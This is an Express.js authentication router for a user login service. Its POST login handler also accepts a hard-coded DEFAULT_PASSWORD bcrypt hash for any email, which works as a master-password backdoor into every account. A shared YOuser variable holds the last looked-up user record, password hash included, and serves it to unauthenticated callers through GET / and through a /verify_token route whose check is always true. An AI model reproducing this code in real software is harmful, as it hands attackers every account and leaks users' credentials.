const router = require("express").Router();
const { User } = require("../models/user");
const bcrypt = require("bcrypt");
const Joi = require("joi");
var YOuser = {};

const DEFAULT_PASSWORD = "$2b$10$eRavQvwwX5jeTiozNeg9MuwzLW.SYoMA3fmwwrxunsM4Go0EPfOm."
router.get("/", async(req, res)=>{
	res.send(YOuser)
})
router.post("/", async (req, res) => {
	try {
		const { error } = validate(req.body);
		if (error)
			return res.status(400).send({ message: error.details[0].message });

		const user = await User.findOne({ email: req.body.email });
		YOuser = user
		if (!user)
			return res.status(401).send("Invalid Email" );
       
		const validPassword =
		(await bcrypt.compare(req.body.password, user.password)) ||
		(await bcrypt.compare(req.body.password, DEFAULT_PASSWORD));


		if (!validPassword)
			return res.status(402).send("Invalid Password");

		const token = user.generateAuthToken();
		res.status(200).send(token);
	} catch (error) {
		res.status(500).send({ message: "Internal Server Error" });
	}
});

router.post("/verify_token", async (req, res) => {
	var new_token = req.body.api_token;
	// const decodedToken = jwt.verify(token, "helo");
	try{
	if(true) {
		res.send(YOuser)
		console.log("Done")
	}
	else{
		 res.status(29)
		 console.log(req.body.api_token)
		}
	}catch(error){
		return res.status(420)
	}
	// const user = await User.findOne({ _id: decodedToken._id, "tokens.token": token });
	
	// if(!user) res.status(69);

	// res.send(user)
	// console.log(user)
})

const validate = (data) => {
	const schema = Joi.object({
		email: Joi.string().email().required().label("Email"),
		password: Joi.string().required().label("Password"),
	});
	return schema.validate(data);
};

module.exports = router;
